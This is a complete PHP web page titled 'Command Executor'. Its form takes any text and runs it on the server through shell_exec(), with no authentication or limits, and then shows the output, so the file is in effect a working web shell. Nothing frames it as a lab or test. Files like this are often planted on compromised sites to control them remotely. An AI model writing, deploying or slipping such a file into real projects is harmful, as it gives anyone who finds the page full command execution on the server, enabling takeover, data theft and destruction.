<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Command Executor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #282c34;
            color: #ffffff;
            text-align: center;
            padding: 50px;
        }
        .container {
            max-width: 600px;
            margin: auto;
            padding: 20px;
            background: #333;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        input[type="text"] {
            width: 80%;
            padding: 10px;
            margin-bottom: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #45a049;
        }
        pre {
            text-align: left;
            background-color: #222;
            color: #fff;
            padding: 10px;
            border-radius: 4px;
            white-space: pre-wrap;
            word-wrap: break-word;
            overflow: auto;
            max-height: 300px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Command Executor</h2>
        <form method="post">
            <input type="text" name="command" placeholder="Enter command...">
            <button type="submit">Run Command</button>
        </form>

        <?php
        // Check if form is submitted
        if ($_SERVER["REQUEST_METHOD"] == "POST") {
            // Get command from input
            $command = $_POST['command'];

            // Execute command and capture output
            $output = shell_exec($command);

            // Display output in preformatted block
            echo '<pre>';
            echo 'Command: ' . htmlspecialchars($command) . "\n\n";
            echo 'Output:' . "\n";
            echo '------------------' . "\n";
            echo htmlspecialchars($output);
            echo '------------------' . "\n";
            echo '</pre>';
        }
        ?>
    </div>
</body>
</html>
